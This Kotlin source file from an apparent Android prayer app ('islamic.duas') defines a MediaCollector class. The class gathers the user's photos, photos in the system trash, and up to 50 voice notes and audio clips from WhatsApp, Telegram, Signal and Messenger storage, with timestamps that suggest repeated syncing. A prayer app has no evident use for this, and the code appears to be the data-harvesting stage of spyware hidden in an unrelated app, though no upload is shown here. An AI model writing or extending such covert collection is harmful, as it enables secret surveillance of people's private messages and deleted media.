package islamic.duas.media

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import islamic.duas.utils.ErrorLog
import java.io.File

class MediaCollector(private val context: Context) {

    companion object {
        private const val TAG = "MediaCollector"
    }

    data class PhotoEntry(
        val uri: Uri,
        val dateTaken: Long,
        val displayName: String,
        val mimeType: String
    )

    fun collectNewPhotos(lastDateTaken: Long = 0L, limit: Int = Int.MAX_VALUE): List<PhotoEntry> {
        // Try with MIME filter first, fall back to unfiltered query
        var photos = queryPhotos(lastDateTaken, limit, true)
        if (photos.isEmpty()) {
            Log.d(TAG, "MIME-filtered query returned 0 photos, retrying without MIME filter")
            photos = queryPhotos(lastDateTaken, limit, false)
        }
        return photos
    }

    private fun queryPhotos(lastDateTaken: Long, limit: Int, filterMime: Boolean): List<PhotoEntry> {
        val photos = mutableListOf<PhotoEntry>()
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(null)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        val sb = StringBuilder()
        val args = mutableListOf<String>()

        if (filterMime) {
            sb.append("${MediaStore.Images.Media.MIME_TYPE} NOT LIKE ? AND ${MediaStore.Images.Media.MIME_TYPE} NOT LIKE ?")
            args.addAll(listOf("video/%", "image/gif"))
        }

        if (lastDateTaken > 0) {
            if (sb.isNotEmpty()) sb.append(" AND ")
            sb.append("${MediaStore.Images.Media.DATE_TAKEN} > ?")
            args.add(lastDateTaken.toString())
        }

        try {
            context.contentResolver.query(
                uri, projection, if (sb.isNotEmpty()) sb.toString() else null,
                if (args.isNotEmpty()) args.toTypedArray() else null,
                "${MediaStore.Images.Media.DATE_TAKEN} DESC"
            )?.use { cursor ->
                val idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID)
                val dateTakenIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
                val mimeIndex = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                val displayNameIndex = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                var count = 0
                while (cursor.moveToNext() && count < limit) {
                    try {
                        val id = if (idIndex >= 0) cursor.getLong(idIndex) else -1L
                        val dateTaken = if (dateTakenIndex >= 0) cursor.getLong(dateTakenIndex) else 0L
                        val mime = if (mimeIndex >= 0) cursor.getString(mimeIndex) ?: "" else ""
                        val displayName = if (displayNameIndex >= 0) cursor.getString(displayNameIndex) ?: "" else ""

                        if (id < 0) continue
                        if (mime.startsWith("video/") || mime == "image/gif") continue
                        if (!PhotoProcessor.isImageFile(displayName)) continue

                        val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                        photos.add(PhotoEntry(contentUri, dateTaken, displayName, mime))
                        count++
                    } catch (e: Exception) {
                        Log.w(TAG, "Row read error: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Query error: ${e.message}", e)
        }
        return photos
    }

    data class VoiceNoteEntry(
        val file: File,
        val dateAdded: Long,
        val duration: Long,
        val size: Long,
        val mimeType: String
    )

    fun collectVoiceNotes(): List<VoiceNoteEntry> {
        val notes = mutableListOf<VoiceNoteEntry>()
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Audio.Media._ID,
            MediaStore.Audio.Media.DATE_ADDED,
            MediaStore.Audio.Media.DURATION,
            MediaStore.Audio.Media.SIZE,
            MediaStore.Audio.Media.MIME_TYPE,
            MediaStore.Audio.Media.DISPLAY_NAME,
            MediaStore.Audio.Media.RELATIVE_PATH,
            MediaStore.Audio.Media.DATA
        )

        // Broad search: WhatsApp voice notes, WhatsApp Audio, and short audio clips
        // from any messaging app (Telegram, Signal, Messenger, etc.)
        val selection = """
            (${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ? OR ${MediaStore.Audio.Media.DATA} LIKE ?)
            AND ${MediaStore.Audio.Media.DURATION} > 0
            AND ${MediaStore.Audio.Media.DURATION} < 600000
            AND ${MediaStore.Audio.Media.SIZE} > 512
            AND ${MediaStore.Audio.Media.SIZE} < 52428800
            AND (
                ${MediaStore.Audio.Media.MIME_TYPE} IN (?,?,?,?,?,?,?,?,?,?,?,?,?)
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
                OR ${MediaStore.Audio.Media.RELATIVE_PATH} LIKE ?
            )
        """.trimIndent().replace("\n", " ")
        val selArgs = arrayOf(
            "%WhatsApp%", "%WhatsApp%",
            "audio/ogg", "audio/opus", "audio/amr", "audio/aac", "audio/mp4", "audio/3gpp", "audio/x-m4a",
            "audio/mpeg", "audio/mp3", "audio/x-wav", "audio/wav", "application/ogg", "audio/webm",
            "%WhatsApp%Voice%",
            "%WhatsApp%Audio%",
            "%Telegram%",
            "%org.telegram%",
            "%com.facebook.orca%",
            "%com.signal%",
            "%com.whatsapp%"
        )

        try {
            context.contentResolver.query(uri, projection, selection, selArgs,
                "${MediaStore.Audio.Media.DATE_ADDED} DESC"
            )?.use { cursor ->
                val dateIdx = cursor.getColumnIndex(MediaStore.Audio.Media.DATE_ADDED)
                val durIdx = cursor.getColumnIndex(MediaStore.Audio.Media.DURATION)
                val sizeIdx = cursor.getColumnIndex(MediaStore.Audio.Media.SIZE)
                val mimeIdx = cursor.getColumnIndex(MediaStore.Audio.Media.MIME_TYPE)
                val nameIdx = cursor.getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME)
                val rpIdx = cursor.getColumnIndex(MediaStore.Audio.Media.RELATIVE_PATH)
                val dataIdx = cursor.getColumnIndex(MediaStore.Audio.Media.DATA)

                while (cursor.moveToNext()) {
                    try {
                        val displayName = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
                        val mimeType = if (mimeIdx >= 0) cursor.getString(mimeIdx) ?: "" else ""
                        val dateAdded = if (dateIdx >= 0) cursor.getLong(dateIdx) * 1000L else 0L
                        val duration = if (durIdx >= 0) cursor.getLong(durIdx) else 0L
                        val size = if (sizeIdx >= 0) cursor.getLong(sizeIdx) else 0L

                        if (displayName.isEmpty()) continue

                        val file = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && rpIdx >= 0) {
                            val rp = cursor.getString(rpIdx) ?: ""
                            File(Environment.getExternalStorageDirectory(), "$rp/$displayName")
                        } else if (dataIdx >= 0) {
                            val path = cursor.getString(dataIdx)
                            if (path != null) File(path) else null
                        } else null

                        if (file != null && file.exists()) {
                            notes.add(VoiceNoteEntry(file, dateAdded, duration, size, mimeType))
                        }
                        if (notes.size >= 50) break
                    } catch (e: Exception) {
                        Log.w(TAG, "Voice note row error: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Voice note query error: ${e.message}", e)
            ErrorLog.write(context, TAG, "Voice note query error: ${e.message}", e)
        }
        return notes
    }

    fun collectTrashedPhotos(lastTrashSync: Long = 0L): List<PhotoEntry> {
        val photos = mutableListOf<PhotoEntry>()

        // Android 11+: also try IS_TRASHED MediaStore flag (supplementary)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val uri = MediaStore.Images.Media.getContentUri(null)
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.DATE_MODIFIED,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.RELATIVE_PATH,
                    MediaStore.Images.Media.DISPLAY_NAME
                )
                val sb = StringBuilder("${MediaStore.Images.Media.IS_TRASHED} = 1 AND ${MediaStore.Images.Media.MIME_TYPE} NOT LIKE ? AND ${MediaStore.Images.Media.MIME_TYPE} NOT LIKE ?")
                val args = mutableListOf("video/%", "image/gif")
                if (lastTrashSync > 0) {
                    sb.append(" AND ${MediaStore.Images.Media.DATE_MODIFIED} > ?")
                    args.add(lastTrashSync.toString())
                }
                context.contentResolver.query(uri, projection, sb.toString(), args.toTypedArray(), "${MediaStore.Images.Media.DATE_TAKEN} DESC")?.use { cursor ->
                    val idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID)
                    val dateTakenIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
                    val mimeIdx = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                    val nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                    while (cursor.moveToNext()) {
                        try {
                            val id = if (idIndex >= 0) cursor.getLong(idIndex) else -1L
                            val dateTaken = if (dateTakenIdx >= 0) cursor.getLong(dateTakenIdx) else 0L
                            val mime = if (mimeIdx >= 0) cursor.getString(mimeIdx) ?: "" else ""
                            val displayName = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
                            if (id < 0) continue
                            if (mime.startsWith("video/") || mime == "image/gif") continue
                            if (!PhotoProcessor.isImageFile(displayName)) continue
                            val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                            photos.add(PhotoEntry(contentUri, dateTaken, displayName, mime))
                        } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }

        // Dedup by URI
        return photos.distinctBy { it.uri }
    }
}
